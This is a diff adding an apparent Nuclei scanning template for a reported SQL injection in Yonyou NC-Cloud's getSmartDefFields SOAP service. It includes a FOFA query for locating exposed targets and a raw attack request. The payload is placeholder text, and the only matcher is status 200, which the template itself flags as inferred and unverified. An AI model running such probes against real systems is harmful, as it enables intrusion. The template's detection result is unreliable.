@@ -1,0 +1,21 @@
+id: poc-c1e6a63b31cc21522376
+info:
+  name: 用友-NC-Cloud系统getSmartDefFields存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/c1e6a63b31cc2152237673c3aea9be1d
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: c1e6a63b31cc2152237673c3aea9be1d
+    fofa: + fofa`app="用友-NC-Cloud"`
+http:
+- raw:
+  - "POST /uapws/service/nc.itf.smart.ISmartQueryWebService HTTP/1.1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: JSESSIONID=0228E626221732545F3EA3725D9F2EC9.ncMem02; JSESSIONID=66E4C3071500C21893E1DBD832D8B8C3.ncMem02\nUpgrade-Insecure-Requests: 1\nSOAPAction: urn:getSmartDefFields\nContent-Type: text/xml;charset=UTF-8\nHost: {{Hostname}}\nContent-Length: 340\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ism=\"http://smart.itf.nc/ISmartQueryWebService\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <ism:getSmartDefFields>\n         <!--type: string-->\n         <ism:string>gero et</ism:string>\n\n      </ism:getSmartDefFields>\n\n   </soapenv:Body>\n\n</soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
